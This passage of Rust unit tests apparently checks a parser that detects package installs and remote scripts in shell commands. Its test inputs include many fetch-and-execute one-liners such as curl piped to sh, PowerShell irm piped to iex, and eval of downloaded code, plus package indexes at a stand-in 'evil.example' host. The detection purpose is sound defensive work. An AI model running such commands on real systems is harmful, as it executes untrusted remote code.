    fn remote_scripts_in_substitutions() {
        assert_eq!(
            scripts(r#"/bin/bash -c "$(curl -fsSL https://x.example/install.sh)""#),
            script("https://x.example/install.sh", "bash")
        );
        assert_eq!(
            scripts("bash <(curl -s https://x.example/i.sh)"),
            script("https://x.example/i.sh", "bash")
        );
        assert_eq!(
            scripts("source <(wget -qO- https://x.example/env.sh)"),
            script("https://x.example/env.sh", "source")
        );
        assert_eq!(
            scripts(r#"eval "$(curl -s https://x.example/init)""#),
            script("https://x.example/init", "eval")
        );
        // A pipe inside `bash -c '...'` still runs.
        assert_eq!(
            scripts("bash -c 'curl -s https://x.example/i.sh | sh'"),
            script("https://x.example/i.sh", "sh")
        );
    }

    #[test]
    fn remote_scripts_in_powershell() {
        assert_eq!(
            scripts("irm https://x.example/install.ps1 | iex"),
            script("https://x.example/install.ps1", "iex")
        );
        assert_eq!(
            scripts("iwr -useb https://x.example/i.ps1 | Invoke-Expression"),
            script("https://x.example/i.ps1", "Invoke-Expression")
        );
    }

    #[test]
    fn inline_script_metadata() {
        let d = tempfile::tempdir().unwrap();
        let script = |name: &str, body: &str| std::fs::write(d.path().join(name), body).unwrap();
        script(
            "s.py",
            "#!/usr/bin/env -S uv run\n# /// script\n# requires-python = \">=3.11\"\n# dependencies = [\n#   \"requests<3\",\n#   \"rich\",\n# ]\n# ///\nimport rich\n",
        );
        script("plain.py", "print('no metadata')\n");
        script(
            "idx.py",
            "# /// script\n# dependencies = [\"httpx\"]\n# [tool.uv]\n# extra-index-url = [\"https://evil.example/simple\"]\n# ///\n",
        );
        script(
            "src.py",
            "# /// script\n# dependencies = [\"y\"]\n# [tool.uv.sources]\n# y = { git = \"https://github.com/x/y\" }\n# ///\n",
        );
        let t = |cmd: &str| -> Vec<Target> {
            parse_command(cmd, d.path())
                .into_iter()
                .flat_map(|i| i.targets)
                .collect()
        };
        let deps = vec![py("requests", Some("<3")), py("rich", None)];
        assert_eq!(t("uv run s.py"), deps);
        assert_eq!(t("uv run --script s.py --flag"), deps);
        assert_eq!(t("uv run -q --python 3.12 s.py"), deps);
        assert_eq!(
            t("uv run --with httpx s.py"),
            [vec![py("httpx", None)], deps.clone()].concat()
        );
        assert_eq!(t("pipx run s.py"), deps);
        assert_eq!(t("./s.py").len(), 0, "a direct run uses no installer");
        let in_project = vec![Target::Project {
            manager: Manager::Uv,
            dir: d.path().to_path_buf(),
            extras: vec![],
            unlocked_only: true,
        }];
        assert_eq!(
            t("uv run plain.py"),
            in_project,
            "no metadata: runs in the project"
        );
        assert!(
            t("pipx run plain.py").is_empty(),
            "a script path is not a package name"
        );
        assert_eq!(t("uv run missing.py"), in_project);
        assert_eq!(
            t("uv run python s.py"),
            in_project,
            "metadata only counts for uv run s.py"
        );
        let idx = t("uv run idx.py");
        assert_eq!(idx[0], py("httpx", None));
        assert!(is_unverifiable(&idx[1]));
        let src = t("uv run src.py");
        assert!(src.iter().any(is_unverifiable) && !src.contains(&py("y", None)));
        assert_eq!(t("uv add --script s.py rich"), vec![py("rich", None)]);
        assert_eq!(
            parse_command("uv run s.py", d.path())[0].tool,
            "uv run s.py"
        );
    }

    #[test]
    fn remote_scripts_run_by_uv_and_pipx() {
        assert_eq!(
            scripts("uv run https://x.example/s.py"),
            script("https://x.example/s.py", "uv run")
        );
        assert_eq!(
            scripts("pipx run https://x.example/s.py arg"),
            script("https://x.example/s.py", "pipx run")
        );
        assert_eq!(
            scripts("curl -sL https://x.example/s.py | uv run -"),
            script("https://x.example/s.py", "uv run")
        );
        assert_eq!(
            scripts("curl -sL https://x.example/s.py | uv run python -"),
            script("https://x.example/s.py", "uv run")
        );
        assert!(scripts("curl -s https://x.example/d.json | uv run tool.py").is_empty());
    }

    #[test]
    fn remote_scripts_saved_then_run() {
        assert_eq!(
            scripts("curl -LsSf https://astral.sh/uv/install.sh -o install.sh && sh install.sh"),
            script("https://astral.sh/uv/install.sh", "sh")
        );
        assert_eq!(
            scripts("curl -fsSLO https://x.example/dl/get.sh?v=2; bash ./get.sh --yes"),
            script("https://x.example/dl/get.sh?v=2", "bash")
        );
        assert_eq!(
            scripts("wget https://bootstrap.pypa.io/get-pip.py && python3 get-pip.py"),
            script("https://bootstrap.pypa.io/get-pip.py", "python3")
        );
        assert_eq!(
            scripts("wget -qO /tmp/n.sh https://x.example/n.sh; sudo bash /tmp/n.sh"),
            script("https://x.example/n.sh", "bash")
        );
        assert_eq!(
            scripts(
                "curl -s https://x.example/i.sh > /tmp/i.sh && chmod +x /tmp/i.sh && /tmp/i.sh"
            ),
            script("https://x.example/i.sh", "exec")
        );
        assert_eq!(
            scripts("curl --output=s.sh https://x.example/s.sh && source s.sh"),
            script("https://x.example/s.sh", "source")
        );
        assert_eq!(
            tools("curl -o i.sh https://x.example/i.sh && sh i.sh"),
            vec!["curl, then sh"]
        );
    }

    #[test]
    fn downloads_saved_and_not_run() {
        for cmd in [
            "curl -o data.json https://api.example.com/x && python3 process.py",
            "wget https://x.example/a.tar.gz && tar xzf a.tar.gz",
            "curl -o install.sh https://x.example/i.sh && cat install.sh",
            "sh install.sh",
            "curl -o a.sh https://x.example/a.sh && sh b.sh",
            "wget -O - https://x.example/a.sh > /dev/null && sh other.sh",
        ] {
            assert!(scripts(cmd).is_empty(), "{cmd}: {:?}", scripts(cmd));
        }
    }

    #[test]
    fn downloads_that_do_not_run_a_script() {
        for cmd in [
            "curl -s https://api.example.com/v1/x | python3 -m json.tool",
            "curl -s https://api.example.com/v1/x | jq .name",
            "curl -s https://api.example.com/v1/x | python -c 'import json,sys; print(json.load(sys.stdin))'",
            "curl -o install.sh https://x.example/i.sh",
            "curl -s https://x.example/a | node -e 'process.stdin.pipe(process.stdout)'",
            "echo hi | sh",
            "cat script.sh | bash",
            "bash -c 'echo $(curl -s https://x.example/ip)'",
            "curl https://x.example/a.tgz | tar xz",
        ] {
            assert!(scripts(cmd).is_empty(), "{cmd}: {:?}", scripts(cmd));
        }
    }

    fn proj(manager: Manager, dir: &str) -> Target {
        Target::Project {
            manager,
            dir: PathBuf::from(dir),
            extras: vec![],
            unlocked_only: false,
        }
    }

    /// What `uv run` syncs before it runs the command.
    fn uv_run(dir: &str) -> Target {
        Target::Project {
            manager: Manager::Uv,
            dir: PathBuf::from(dir),
            extras: vec![],
            unlocked_only: true,
        }
    }

    #[test]
    fn uv_run_syncs_the_project() {
        assert_eq!(targets("uv run pytest -q"), vec![uv_run("/nonexistent")]);
        assert_eq!(
            targets("uv --directory app run pytest"),
            vec![uv_run("/nonexistent/app")]
        );
        assert_eq!(
            targets("uv run --project app pytest"),
            vec![uv_run("/nonexistent/app")]
        );
        assert_eq!(
            targets("uv run --with pandas python x.py"),
            vec![py("pandas", None), uv_run("/nonexistent")]
        );
        for c in [
            "uv run --no-sync pytest",
            "uv run --no-project python x.py",
            "uv run --script missing.py",
            "uv run https://x.example/s.py",
        ] {
            assert!(
                !targets(c)
                    .iter()
                    .any(|t| matches!(t, Target::Project { .. })),
                "{c}"
            );
        }
    }

    fn is_unverifiable(t: &Target) -> bool {
        matches!(t, Target::Unverifiable { .. })
    }

    #[test]
    fn pip_basic_forms() {
        assert_eq!(targets("pip install requests"), vec![py("requests", None)]);
        assert_eq!(
            targets("pip3 install requests==2.31.0"),
            vec![py("requests", Some("2.31.0"))]
        );
        assert_eq!(
            targets("pip3.12 install 'requests>=2,<3'"),
            vec![py("requests", Some(">=2,<3"))]
        );
        assert_eq!(
            targets("python -m pip install Flask[async]"),
            vec![py("flask", None)]
        );
        assert_eq!(
            targets("python3.11 -m pip install -U pip setuptools"),
            vec![py("pip", None), py("setuptools", None)]
        );
        assert_eq!(
            targets("/usr/bin/python3 -m pip install --user six"),
            vec![py("six", None)]
        );
        assert_eq!(targets("py -m pip install x"), vec![py("x", None)]);
        assert_eq!(
            targets("pip install --upgrade 'Django ~= 4.2'"),
            vec![py("django", Some("~=4.2"))]
        );
        assert_eq!(
            targets("pip install pkg===1.0"),
            vec![py("pkg", Some("1.0"))]
        );
        assert_eq!(
            targets("pip install 'pkg==1.*'"),
            vec![py("pkg", Some("==1.*"))]
        );
        assert_eq!(
            targets("pip install 'pkg; python_version<\"3.8\"'"),
            vec![py("pkg", None)]
        );
        assert_eq!(
            targets("pip install Python_DateUtil"),
            vec![py("python-dateutil", None)]
        );
        assert_eq!(
            targets("pip -q --disable-pip-version-check install a b c").len(),
            3
        );
        assert!(targets("pip list").is_empty());
        assert!(targets("pip install").is_empty());
        assert!(targets("pip show requests").is_empty());
        assert!(targets("python script.py install requests").is_empty());
        assert!(targets("python -c 'import pip' install x").is_empty());
    }

    #[test]
    fn pip_option_values_are_not_packages() {
        assert_eq!(
            targets("pip install --target ./vendor --platform manylinux2014_x86_64 --only-binary=:all: --python-version 3.11 numpy"),
            vec![py("numpy", None)]
        );
        assert_eq!(
            targets("pip install -t lib --no-deps pkg"),
            vec![py("pkg", None)]
        );
        assert_eq!(
            targets("pip install -c constraints.txt pkg"),
            vec![py("pkg", None)]
        );
        assert_eq!(
            targets("pip install --cache-dir /tmp/c --timeout 30 pkg"),
            vec![py("pkg", None)]
        );
        assert_eq!(
            targets("pip install --config-settings key=val pkg"),
            vec![py("pkg", None)]
        );
    }

    #[test]
    fn editable_and_paths() {
        assert!(targets("pip install -e .").is_empty());
        assert!(targets("pip install -e ./lib/foo").is_empty());
        assert!(targets("pip install -e.").is_empty());
        assert!(targets("pip install --editable=../x").is_empty());
        let t = targets("pip install -e git+https://github.com/x/y.git#egg=y");
        assert!(is_unverifiable(&t[0]));
        for cmd in [
            "pip install .",
            "pip install ./dist/pkg-1.0-py3-none-any.whl",
            "pip install /tmp/pkg.tar.gz",
            "pip install pkg-1.0.zip",
            "pip install ~/code/pkg",
            "pip install src/pkg",
        ] {
            let t = targets(cmd);
            assert_eq!(t.len(), 1, "{cmd}");
            assert!(is_unverifiable(&t[0]), "{cmd}");
        }
    }

    #[test]
    fn urls_and_direct_references() {
        for cmd in [
            "pip install git+https://github.com/psf/requests",
            "pip install https://example.com/pkg-1.0.tar.gz",
            "pip install 'pkg @ https://example.com/pkg.whl'",
            "pip install pkg@git+https://github.com/a/b",
            "pip install 'pkg @ file:///tmp/pkg'",
        ] {
            let t = targets(cmd);
            assert_eq!(t.len(), 1, "{cmd}");
            match &t[0] {
                Target::Unverifiable { reason, .. } => assert!(!reason.is_empty()),
                other => panic!("{cmd}: {other:?}"),
            }
        }
    }

    #[test]
    fn custom_indexes_are_flagged() {
        let t = targets("pip install -i https://evil.example/simple pkg");
        assert_eq!(t.len(), 2);
        assert!(
            matches!(&t[0], Target::Unverifiable { reason, .. } if reason.contains("evil.example"))
        );
        assert_eq!(t[1], py("pkg", None));
        assert!(is_unverifiable(
            &targets("pip install --extra-index-url=https://x/simple a")[0]
        ));
        assert!(is_unverifiable(
            &targets("npm install --registry https://r.example x")[0]
        ));
        assert!(is_unverifiable(
            &targets("npm --registry=https://r.example install x")[0]
        ));
    }

    #[test]
    fn requirements_files() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::create_dir(dir.path().join("sub")).unwrap();
        std::fs::write(
            dir.path().join("requirements.txt"),
            "# comment\nrequests==2.31.0  # pinned\nflask>=2 \\\n  ,<3\n\n-r sub/more.txt\n-e .\n--index-url https://pypi.org/simple\nnumpy==1.26.4 --hash=sha256:abc \\\n    --hash=sha256:def\ngit+https://github.com/a/b\n",
        )
        .unwrap();
        std::fs::write(dir.path().join("sub/more.txt"), "six\n-rnested.txt\n").unwrap();
        std::fs::write(dir.path().join("sub/nested.txt"), "attrs[tests]==23.1\n").unwrap();
        let t: Vec<Target> = parse_command("pip install -r requirements.txt", dir.path())
            .into_iter()
            .flat_map(|i| i.targets)
            .collect();
        assert_eq!(t[0], py("requests", Some("2.31.0")));
        assert_eq!(t[1], py("flask", Some(">=2,<3")));
        assert_eq!(t[2], py("six", None));
        assert_eq!(t[3], py("attrs", Some("23.1")));
        assert!(is_unverifiable(&t[4])); // custom index line
        assert_eq!(t[5], py("numpy", Some("1.26.4")));
        assert!(is_unverifiable(&t[6]));
        assert_eq!(t.len(), 7);

        let t: Vec<Target> = parse_command("pip install -rrequirements.txt", dir.path())
            .into_iter()
            .flat_map(|i| i.targets)
            .collect();
        assert_eq!(t.len(), 7);
        let t = targets("pip install -r missing.txt");
        assert!(
            matches!(&t[0], Target::Unverifiable { reason, .. } if reason.contains("missing.txt"))
        );
    }

    #[test]
    fn wrappers_and_env_prefixes() {
        assert_eq!(targets("FOO=1 BAR=2 pip install x"), vec![py("x", None)]);
        assert_eq!(targets("sudo -H pip install x"), vec![py("x", None)]);
        assert_eq!(
            targets("sudo -u root -E pip3 install x"),
            vec![py("x", None)]
        );
        assert_eq!(
            targets("env -i PATH=/bin pip install x"),
            vec![py("x", None)]
        );
        assert_eq!(targets("timeout 60 npm install y"), vec![js("y", None)]);
        assert_eq!(
            targets("time nohup nice -n 5 pip install x"),
            vec![py("x", None)]
        );
        assert_eq!(targets("command pip install x"), vec![py("x", None)]);
        assert!(targets("command -v pip").is_empty());
        assert_eq!(
            targets("bash -c 'pip install x && npm i y'"),
            vec![py("x", None), js("y", None)]
        );
        assert_eq!(targets("sh -lc \"uv add z\""), vec![py("z", None)]);
        assert_eq!(targets("eval pip install x"), vec![py("x", None)]);
        assert_eq!(
            targets("if true; then pip install x; fi"),
            vec![py("x", None)]
        );
    }

    #[test]
    fn compound_commands() {
        assert_eq!(
            targets("cd /app && source .venv/bin/activate && pip install -q a; npm ci && npm i -D b | cat"),
            vec![
                py("a", None),
                proj(Manager::Npm, "/nonexistent"),
                js("b", None)
            ]
        );
        assert_eq!(targets("echo pip install x"), vec![]);
        assert_eq!(targets("git commit -m 'pip install x'"), vec![]);
        assert_eq!(
            targets("echo $(pip install hidden)"),
            vec![py("hidden", None)]
        );
        assert_eq!(
            targets("pip install a > log.txt 2>&1 && echo done"),
            vec![py("a", None)]
        );
    }

    #[test]
    fn uv_poetry_pipx_pdm() {
        assert_eq!(
            targets("uv pip install requests"),
            vec![py("requests", None)]
        );
        assert_eq!(
            targets("uv pip install --system -r /nonexistent/r.txt").len(),
            1
        );
        assert_eq!(
            targets("uv add 'httpx>=0.27' --dev"),
            vec![py("httpx", Some(">=0.27"))]
        );
        assert_eq!(targets("uv add --group lint ruff"), vec![py("ruff", None)]);
        assert_eq!(targets("uv --directory sub add x"), vec![py("x", None)]);
        assert_eq!(
            targets("uv tool install ruff@0.6.0"),
            vec![py("ruff", Some("0.6.0"))]
        );
        assert_eq!(targets("uvx ruff check ."), vec![py("ruff", None)]);
        assert_eq!(
            targets("uvx ruff@0.5.0 --version"),
            vec![py("ruff", Some("0.5.0"))]
        );
        assert_eq!(
            targets("uvx --from 'httpie==3.2' http GET example.com"),
            vec![py("httpie", Some("3.2"))]
        );
        assert_eq!(
            targets("uvx --with rich --python 3.12 pycowsay hi"),
            vec![py("rich", None), py("pycowsay", None)]
        );
        assert_eq!(targets("uv tool run black"), vec![py("black", None)]);
        assert_eq!(
            targets("uv run --with pandas,numpy python x.py"),
            vec![
                py("pandas", None),
                py("numpy", None),
                uv_run("/nonexistent")
            ]
        );
        assert_eq!(targets("uv run python x.py"), vec![uv_run("/nonexistent")]);
        assert_eq!(targets("uv sync"), vec![proj(Manager::Uv, "/nonexistent")]);
        assert_eq!(
            targets("poetry add requests@^2.28"),
            vec![py("requests", Some("^2.28"))]
        );
        assert_eq!(
            targets("poetry add -G dev pytest@latest"),
            vec![py("pytest", None)]
        );
        assert_eq!(
            targets("poetry add 'django>=4,<5'"),
            vec![py("django", Some(">=4,<5"))]
        );
        assert_eq!(targets("pdm add rich"), vec![py("rich", None)]);
        // pixi: only `--pypi` specs come from PyPI; the rest are conda packages.
        assert_eq!(targets("pixi add --pypi rich"), vec![py("rich", None)]);
        assert_eq!(
            targets("pixi add --manifest-path ./pixi.toml -f dev --pypi 'httpx>=0.27' black"),
            vec![py("httpx", Some(">=0.27")), py("black", None)]
        );
        assert!(targets("pixi add numpy python=3.12").is_empty());
        assert!(targets("pixi run --pypi-keyring-provider subprocess test").is_empty());
        assert!(is_unverifiable(
            &targets("pixi add --pypi --git https://github.com/x/y.git y")[0]
        ));
        assert_eq!(targets("pipx install black"), vec![py("black", None)]);
        assert_eq!(
            targets("pipx install --python python3.12 'black==24.1.0'"),
            vec![py("black", Some("24.1.0"))]
        );
        assert_eq!(targets("pipx run cowsay moo"), vec![py("cowsay", None)]);
        assert_eq!(
            targets("pipx run --spec httpie==3.2 http"),
            vec![py("httpie", Some("3.2"))]
        );
        assert_eq!(
            targets("pipx inject black black-plugin"),
            vec![py("black-plugin", None)]
        );
        assert_eq!(targets("python -m pipx install x"), vec![py("x", None)]);
    }

    #[test]
    fn npm_family() {
        assert_eq!(targets("npm install left-pad"), vec![js("left-pad", None)]);
        assert_eq!(
            targets("npm i lodash@4.17.21 -D"),
            vec![js("lodash", Some("4.17.21"))]
        );
        assert_eq!(
            targets("npm install --save-dev @types/node@^20"),
            vec![js("@types/node", Some("^20"))]
        );
        assert_eq!(
            targets("npm add -g typescript"),
            vec![js("typescript", None)]
        );
        assert_eq!(targets("npm isntall chalk"), vec![js("chalk", None)]);
        assert_eq!(targets("npm install react@latest"), vec![js("react", None)]);
        assert_eq!(
            targets("npm install 'react@>=18 <19'"),
            vec![js("react", Some(">=18 <19"))]
        );
        assert_eq!(
            targets("npm install @babel/core"),
            vec![js("@babel/core", None)]
        );
        assert_eq!(
            targets("npm install --prefix ./x --tag beta pkg"),
            vec![js("pkg", None)]
        );
        assert_eq!(
            targets("npm --prefix ./x install pkg"),
            vec![js("pkg", None)]
        );
        assert_eq!(
            targets("npm install my-alias@npm:real-pkg@1.0.0"),
            vec![js("real-pkg", Some("1.0.0"))]
        );
        assert_eq!(targets("npm install Left-Pad"), vec![js("left-pad", None)]);
        assert_eq!(
            targets("npm install"),
            vec![proj(Manager::Npm, "/nonexistent")]
        );
        assert_eq!(targets("npm ci"), vec![proj(Manager::Npm, "/nonexistent")]);
        assert!(targets("npm run build").is_empty());
        assert!(targets("npm test").is_empty());
        assert_eq!(targets("pnpm add -D vitest"), vec![js("vitest", None)]);
        assert_eq!(targets("pnpm --filter web add zod"), vec![js("zod", None)]);
        assert_eq!(
            targets("pnpm install"),
            vec![proj(Manager::Pnpm, "/nonexistent")]
        );
        assert_eq!(
            targets("yarn add react react-dom"),
            vec![js("react", None), js("react-dom", None)]
        );
        assert_eq!(targets("yarn global add serve"), vec![js("serve", None)]);
        assert_eq!(targets("yarn"), vec![proj(Manager::Yarn, "/nonexistent")]);
        assert_eq!(targets("bun add elysia"), vec![js("elysia", None)]);
        assert_eq!(targets("bun i -d prettier"), vec![js("prettier", None)]);
    }

    #[test]
    fn project_installs() {
        let at = |cmd: &str| parse_command(cmd, Path::new("/w")).remove(0).targets;
        assert_eq!(
            at("npm ci --prefix web"),
            vec![proj(Manager::Npm, "/w/web")]
        );
        assert_eq!(
            at("npm --prefix=web install --omit dev"),
            vec![proj(Manager::Npm, "/w/web")]
        );
        assert_eq!(at("npm clean-install"), vec![proj(Manager::Npm, "/w")]);
        assert!(matches!(
            at("npm install --registry https://r.example/").as_slice(),
            [Target::Unverifiable { .. }, Target::Project { .. }]
        ));
        assert_eq!(
            at("pnpm -C app i --frozen-lockfile"),
            vec![proj(Manager::Pnpm, "/w/app")]
        );
        assert_eq!(at("yarn --cwd app"), vec![proj(Manager::Yarn, "/w/app")]);
        assert!(parse_command("yarn --version", Path::new("/w")).is_empty());
        assert_eq!(
            at("yarn install --immutable"),
            vec![proj(Manager::Yarn, "/w")]
        );
        assert_eq!(
            at("bun install --frozen-lockfile"),
            vec![proj(Manager::Bun, "/w")]
        );
        assert_eq!(at("bun i --cwd=app"), vec![proj(Manager::Bun, "/w/app")]);
        assert_eq!(
            at("uv --directory svc sync --frozen"),
            vec![proj(Manager::Uv, "/w/svc")]
        );
        assert_eq!(
            at("uv sync --project=svc"),
            vec![proj(Manager::Uv, "/w/svc")]
        );
        assert_eq!(
            at("poetry -C svc install"),
            vec![proj(Manager::Poetry, "/w/svc")]
        );
        assert_eq!(at("poetry sync"), vec![proj(Manager::Poetry, "/w")]);
        assert_eq!(
            at("pipenv install --dev"),
            vec![proj(Manager::Pipenv, "/w")]
        );
        assert_eq!(at("pipenv sync"), vec![proj(Manager::Pipenv, "/w")]);
        assert_eq!(
            at("pipenv install --python 3.12 requests==2.31.0"),
            vec![py("requests", Some("2.31.0"))]
        );
        // `uv pip sync` reads requirements files.
        assert!(matches!(
            at("uv pip sync --python 3.12 missing.txt").as_slice(),
            [Target::Unverifiable { spec, .. }] if spec.contains("missing.txt")
        ));
        // Adding packages is not a project install.
        assert_eq!(at("pnpm add zod"), vec![js("zod", None)]);
        assert_eq!(at("bun add zod"), vec![js("zod", None)]);
        assert!(parse_command("npm run build", Path::new("/w")).is_empty());
    }

    #[test]
    fn pip_local_projects() {
        let d = tempfile::tempdir().unwrap();
        std::fs::create_dir(d.path().join("lib")).unwrap();
        std::fs::write(d.path().join("pyproject.toml"), "[project]\nname = \"a\"\n").unwrap();
        std::fs::write(d.path().join("reqs.txt"), "-e .[dev]\n").unwrap();
        let at = |cmd: &str| -> Vec<Target> {
            parse_command(cmd, d.path())
                .into_iter()
                .flat_map(|i| i.targets)
                .collect()
        };
        let here = |extras: &[&str]| Target::Project {
            manager: Manager::Pip,
            dir: d.path().join("."),
            extras: extras.iter().map(|e| e.to_string()).collect(),
            unlocked_only: false,
        };
        assert_eq!(at("pip install -e ."), vec![here(&[])]);
        assert_eq!(
            at("uv pip install -e '.[dev, test]'"),
            vec![here(&["dev", "test"])]
        );
        assert_eq!(at("pip install -r reqs.txt"), vec![here(&["dev"])]);
        // A non-editable local install also builds the project itself, which is not checked.
        assert!(matches!(
            at("pip install .").as_slice(),
            [Target::Unverifiable { .. }, Target::Project { .. }]
        ));
        // No pyproject.toml, nothing to expand.
        assert!(at("pip install -e ./lib").is_empty());
    }

    #[test]
    fn npm_unverifiable_specs() {
        for spec in [
            "github:user/repo",
            "user/repo",
            "git+ssh://git@github.com/u/r.git",
            "https://example.com/x.tgz",
            "./local-dir",
            "../pkg.tgz",
            "file:../x",
            "pkg@git+https://github.com/u/r",
            "pkg@file:../x",
            "workspace:*",
        ] {
            let t = targets(&format!("npm install {spec}"));
            assert_eq!(t.len(), 1, "{spec}");
            assert!(is_unverifiable(&t[0]), "{spec}: {:?}", t[0]);
        }
    }

    #[test]
    fn npx_and_friends() {
        assert_eq!(targets("npx cowsay hello"), vec![js("cowsay", None)]);
        assert_eq!(
            targets("npx -y create-react-app@5 my-app"),
            vec![js("create-react-app", Some("5"))]
        );
        assert_eq!(
            targets("npx --yes @angular/cli@17 new app"),
            vec![js("@angular/cli", Some("17"))]
        );
        assert_eq!(
            targets("npx -p typescript -p ts-node ts-node x.ts"),
            vec![js("typescript", None), js("ts-node", None)]
        );
        assert_eq!(
            targets("npx --package=eslint -- eslint ."),
            vec![js("eslint", None)]
        );
        assert_eq!(
            targets("npm exec -- prettier --write ."),
            vec![js("prettier", None)]
        );
        assert_eq!(targets("npm x vite"), vec![js("vite", None)]);
        assert_eq!(targets("pnpm dlx degit user/repo"), vec![js("degit", None)]);
        assert_eq!(targets("pnpx serve"), vec![js("serve", None)]);
        assert_eq!(
            targets("yarn dlx create-vite"),
            vec![js("create-vite", None)]
        );
        assert_eq!(targets("bunx cowsay"), vec![js("cowsay", None)]);
        assert_eq!(targets("bun x tsc"), vec![js("tsc", None)]);
        assert_eq!(
            tools("npx a; uvx b; pip install c"),
            vec!["npx", "uvx", "pip install"]
        );
    }

    #[test]
    fn deno_commands() {
        assert_eq!(
            targets("deno add npm:chalk@5 jsr:@std/path npm:@types/node@22 lodash"),
            vec![
                js("chalk", Some("5")),
                Target::Unverifiable {
                    ecosystem: Ecosystem::Npm,
                    spec: "jsr:@std/path".into(),
                    reason: "JSR packages are not checked".into()
                },
                js("@types/node", Some("22")),
                js("lodash", None)
            ]
        );
        assert_eq!(
            targets("deno add --dev -c deno.json npm:vitest"),
            vec![js("vitest", None)]
        );
        assert_eq!(targets("deno install npm:ms@2"), vec![js("ms", Some("2"))]);
        assert_eq!(
            targets("deno install -g -n serve -A npm:serve@14 --port 80"),
            vec![js("serve", Some("14"))]
        );
        assert_eq!(targets("deno install -g ./cli.ts"), vec![]);
        assert_eq!(targets("deno install --entrypoint main.ts"), vec![]);
        let at = |cmd: &str| -> Vec<Target> {
            parse_command(cmd, Path::new("/w"))
                .into_iter()
                .flat_map(|i| i.targets)
                .collect()
        };
        assert_eq!(at("deno install"), vec![proj(Manager::Deno, "/w")]);
        assert_eq!(
            at("deno install --frozen --allow-scripts"),
            vec![proj(Manager::Deno, "/w")]
        );
        assert_eq!(at("deno ci"), vec![proj(Manager::Deno, "/w")]);
        // The script runs; what follows it is its own arguments.
        assert_eq!(
            targets("deno run -A npm:cowsay@1.6.0 npm:other"),
            vec![js("cowsay", Some("1.6.0"))]
        );
        assert_eq!(
            targets("deno run --config deno.json -A npm:@scope/tool@2/bin/cli.js"),
            vec![js("@scope/tool", Some("2"))]
        );
        assert_eq!(targets("deno run -A main.ts npm:x"), vec![]);
        assert_eq!(targets("deno run dev"), vec![]);
        assert!(is_unverifiable(
            &targets("deno run -A https://example.com/install.ts")[0]
        ));
        assert_eq!(targets("deno x cowsay hi"), vec![js("cowsay", None)]);
        assert_eq!(
            targets("deno x -y -p npm:typescript@5 tsc --init"),
            vec![js("typescript", Some("5"))]
        );
        assert_eq!(targets("dx --yes prettier ."), vec![js("prettier", None)]);
        assert_eq!(
            targets("deno create npm:vite@6 app"),
            vec![js("create-vite", Some("6"))]
        );
        assert_eq!(
            targets("deno create --npm @scope/thing"),
            vec![js("@scope/create-thing", None)]
        );
        assert!(is_unverifiable(&targets("deno create jsr:@fresh/init")[0]));
        assert_eq!(targets("deno create vite"), vec![]);
        assert_eq!(targets("deno fmt && deno test -A"), vec![]);
        assert_eq!(tools("deno add npm:a; dx b"), ["deno add", "dx"]);
    }

    #[test]
    fn deno_checks_npm_imports_of_the_code_it_runs() {
        let d = tempfile::tempdir().unwrap();
        std::fs::create_dir(d.path().join("lib")).unwrap();
        std::fs::write(
            d.path().join("main.ts"),
            concat!(
                "import chalk from \"npm:chalk@5\";\n",
                "import { join } from \"jsr:@std/path\";\n",
                "import { x } from './lib/util.ts';\n",
                "const ms = await import('npm:ms@2/index.js');\n",
                "export * from \"npm:@scope/pkg@1\";\n",
                "import \"npm:chalk@5\";\n",
            ),
        )
        .unwrap();
        std::fs::write(
            d.path().join("lib/util.ts"),
            "import pad from \"npm:left-pad-xyz\";\nimport { y } from \"../main.ts\";\nexport const x = 1;\n",
        )
        .unwrap();
        std::fs::write(d.path().join("plain.ts"), "console.log(1);\n").unwrap();
        let at = |cmd: &str| -> Vec<Target> {
            parse_command(cmd, d.path())
                .into_iter()
                .flat_map(|i| i.targets)
                .collect()
        };
        let imported = vec![
            js("chalk", Some("5")),
            js("ms", Some("2")),
            js("@scope/pkg", Some("1")),
            js("left-pad-xyz", None),
        ];
        assert_eq!(at("deno run -A main.ts --port 80"), imported);
        assert_eq!(at("deno serve --port 8000 main.ts"), imported);
        assert_eq!(at("deno test -A main.ts"), imported);
        assert_eq!(at("deno run plain.ts"), vec![]);
        assert_eq!(at("deno run missing.ts"), vec![]);
        assert_eq!(
            at("deno eval \"const m = await import('npm:cowsay@1'); m.say()\""),
            vec![js("cowsay", Some("1"))]
        );
        assert_eq!(
            parse_command("deno run -A main.ts", d.path())[0].tool,
            "deno run main.ts"
        );
    }

    #[test]
    fn create_initializers() {
        assert_eq!(
            targets("npm create vite@5 my-app -- --template react"),
            vec![js("create-vite", Some("5"))]
        );
        assert_eq!(
            targets("npm init react-app my-app"),
            vec![js("create-react-app", None)]
        );
        assert_eq!(targets("npm init -y"), vec![]);
        assert_eq!(targets("npm init"), vec![]);
        assert_eq!(
            targets("npm init --yes @vue/app@3"),
            vec![js("@vue/create-app", Some("3"))]
        );
        assert_eq!(
            targets("pnpm create @angular"),
            vec![js("@angular/create", None)]
        );
        assert_eq!(
            targets("yarn create next-app web"),
            vec![js("create-next-app", None)]
        );
        assert_eq!(
            targets("bun create hono api"),
            vec![js("create-hono", None)]
        );
        assert_eq!(targets("bun c elysia app"), vec![js("create-elysia", None)]);
        assert!(matches!(
            &targets("bun create someone/template app")[..],
            [Target::Unverifiable { .. }]
        ));
        assert_eq!(targets("bun create ./Button.tsx"), vec![]);
        assert_eq!(create_package("@scope@1.0.0"), "@scope/create@1.0.0");
        assert_eq!(create_package("\u{e9}t\u{e9}"), "create-\u{e9}t\u{e9}");
        assert_eq!(targets("npm init ''"), vec![]);
    }

    #[test]
    fn spec_parsers() {
        assert_eq!(
            parse_pypi_spec("requests[security,socks]>=2.0"),
            py("requests", Some(">=2.0"))
        );
        assert_eq!(
            parse_pypi_spec("requests (>=2.0)"),
            py("requests", Some(">=2.0"))
        );
        assert_eq!(parse_pypi_spec("x!=1.0"), py("x", Some("!=1.0")));
        assert!(is_unverifiable(&parse_pypi_spec("--bogus")));
        assert!(is_unverifiable(&parse_pypi_spec("pkg extra-word")));
        assert_eq!(
            parse_npm_spec("@scope/pkg@^1"),
            js("@scope/pkg", Some("^1"))
        );
        assert_eq!(parse_npm_spec("@scope/pkg"), js("@scope/pkg", None));
        assert_eq!(parse_npm_spec("pkg@next"), js("pkg", Some("next")));
        assert!(is_unverifiable(&parse_npm_spec("@scope")));
        assert!(is_unverifiable(&parse_npm_spec("bad name")));
    }
}
